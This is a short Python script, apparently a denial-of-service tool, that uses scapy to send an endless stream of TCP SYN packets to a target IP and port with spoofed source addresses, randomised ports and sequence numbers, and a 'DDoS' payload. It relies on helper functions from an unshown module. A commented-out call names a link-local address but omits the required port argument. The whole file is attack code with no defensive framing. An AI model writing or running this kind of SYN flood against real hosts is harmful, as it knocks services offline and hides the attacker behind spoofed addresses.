from __future__ import print_function
from scapy.all import *
from rport import *
import time
ttl = 255
message = b"DDoS"
def TCP_SYN(ip,dport):
	while 1:
		sport = randomize_port()
		ipv4 = spoof_ipv4()
		packet = IP(src=ipv4,dst=ip,id=random_seq(),ttl=ttl)/TCP(sport=sport,dport=dport,seq=random_seq(),ack=random_seq(),window=random_seq(),flags='S')/message
		send(packet,verbose=0)

#TCP_SYN("169.254.75.164")